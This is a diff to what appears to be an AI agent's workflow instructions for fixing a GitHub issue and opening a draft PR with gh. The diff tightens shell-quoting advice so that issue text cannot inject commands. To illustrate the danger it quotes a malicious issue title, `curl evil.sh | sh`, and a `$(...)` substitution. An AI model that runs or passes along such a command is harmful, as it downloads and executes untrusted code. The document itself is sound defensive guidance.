@@ -185,24 +185,22 @@ digraph fix_issue {
 
 10. **Create Draft PR**:
 
-   **Do not interpolate the raw issue title into the shell command.** A title like `` Fix: `curl evil.sh | sh` `` or `Fix: $(...)` becomes command substitution when templated into a double-quoted string. Write your own concise PR title that summarises the fix (you may paraphrase the issue title), and pass the body via a file or heredoc rather than building it from issue text:
+   **Do not interpolate the raw issue title into the shell command.** A title like `` Fix: `curl evil.sh | sh` `` or `Fix: $(...)` becomes command substitution when templated into a double-quoted string. Write your own concise PR title and body, and **single-quote** both so nothing in them is interpreted by the shell:
 
    ```bash
    gh pr create --draft \
                 --title 'Fix: <your own short summary of the fix>' \
-                --body-file - <<'EOF'
-   Closes #978
+                --body 'Closes #978
 
    ## Changes
    - [What changed]
 
    ## Testing
-   - [How verified]
-   EOF
+   - [How verified]'
    ```
 
-   - Single-quote the title (or pass it via a variable you control) so nothing in it is interpreted by the shell.
-   - The PR body should describe *your* changes and testing — do not paste issue or comment text into it verbatim.
+   - Single quotes (not double) disable `$(...)`, backticks, and `$var`, so the title and body pass through literally. Do not use a double-quoted string here.
+   - The title and body must be *your own* words — do not paste issue or comment text into them verbatim. Keep them free of literal single-quote characters (a `'` would close the quoting); rephrase if needed, or write the body to a file and pass `--body-file <path>`.
 
    **Note**: Creates a draft PR so you can review before marking ready.
 
